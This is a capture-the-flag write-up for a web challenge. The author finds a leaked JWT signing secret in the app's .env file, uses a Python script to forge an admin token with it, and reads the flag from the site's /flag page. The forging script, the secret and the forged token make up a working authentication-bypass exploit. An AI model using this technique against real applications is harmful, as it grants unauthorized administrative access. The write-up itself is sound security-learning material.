# Jasons Baking Services

## Description
```
Hey intern! We were able to swipe Jasons application from Github, see if you can find anything useful in the code that will allow you to exploit the real application.

(Be ready to be flash-banged, the web-app is all white!)
```

## Writeup

We are provided the website link and also the files of the website. <br/>
![grafik](https://github.com/Aryt3/writeups/assets/110562298/1c6a4c75-44a2-4d4c-ba3d-32e8c3733cfa)

After logging in we can see that we have a cookie. <br/>
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzIiwiYXV0aG9yaXplZCI6dHJ1ZSwiYWRtaW4iOmZhbHNlLCJpYXQiOjE2OTg0ODA2OTksImV4cCI6MTY5ODQ4MDk5OX0.lHZvz6EJdExLvl99JRD4SCFP55Afh8NFKZ_m7lv4JCI
```

Deocding the cookie with base64 we receive. <br/>
```
{"alg":"HS256","typ":"JWT"}{"name":"123","authorized":true,"admin":false,"iat":1698480699,"exp":1698480999}...
```

Now I already knew that it looked like a json web token but now I know for sure. <br/>
Let's take a look at the source code. <br/>
```js
route.get('/flag', authenticateJson, (req, res) => {
    if (!req.user) {
        res.render('index')
    } else {
        if (req.user.admin == true) {
            res.send("// Print Flag Here")
        } else {
            res.render('dashboard', {name: req.user.name})
        }
    }
})

function authenticateJson(req, res, next) {
    console.log('Cookie: ', req.cookies['token'])
    const token = req.cookies['token'];
    if (token == null) return res.sendStatus(401)

    jwt.verify(token, process.env.SECRET, (err, user) => {
        if (err) {
            res.sendStatus(403)
        }
        req.user = user
        next()
    })
}
```

Also we found `https://spooky-jason-bakeshop-web.chals.io/flag` but can't access it because we receive a 401. <br/>
We do of course see some interesting functions but what interests me the most is the `.env` file. <br/>
```env
SECRET=y5ABWPpr76vyLjWxZQZvxpFZuprCwAZa6HhWaaDgS7WBEbzWWceuAe45htGLa
SECRET_REFRESH=y5ABWPpr76vyLjWxZQZvxpFZuprCwAZa6HhWaaDgS7WBEbzWWceuAe45htGLa
```

Because I have already worked with JWT I know that once you get the secret key you are basically able to forge your own tokens. <br/>
Coding a small python script to get a nice token with elevated permissions. <br/>
```py
import jwt

secret_key='y5ABWPpr76vyLjWxZQZvxpFZuprCwAZa6HhWaaDgS7WBEbzWWceuAe45htGLa'

payload = {
        'name': 'admin',
        'authorized': True,
        'admin': True
}

token = jwt.encode(payload, secret_key, algorithm='HS256')

print(token)
```

Once executed we receive the token below. <br/>
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhdXRob3JpemVkIjp0cnVlLCJhZG1pbiI6dHJ1ZX0.7LsUVGaCPyS4GL6qIpu4qn3CAEQLXLnPwNWe1SvxUGA
```

Now we can just paste it into our cookie and reload the page `https://spooky-jason-bakeshop-web.chals.io/flag`. <br/>
Seems liek we got through and found the flag `NICC{jWoT_tOkeNs_nEed_saf3_secr3ts}`. 






